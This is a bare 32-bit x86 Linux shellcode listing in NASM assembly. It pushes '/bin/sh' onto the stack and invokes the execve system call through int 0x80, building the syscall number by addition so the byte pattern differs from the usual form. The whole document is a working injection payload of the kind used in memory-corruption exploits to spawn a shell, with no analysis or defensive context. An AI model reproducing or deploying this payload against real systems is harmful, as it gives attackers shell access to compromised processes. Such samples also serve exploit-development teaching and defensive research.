BITS 32
xor    ecx,ecx
mul    ecx
mov    al, 0x5; mov al, 0xb; 
add    al, 0x6
push   ecx
push   0x68732f2f
push   0x6e69622f; /bin/sh
mov    ebx,esp
int    0x80
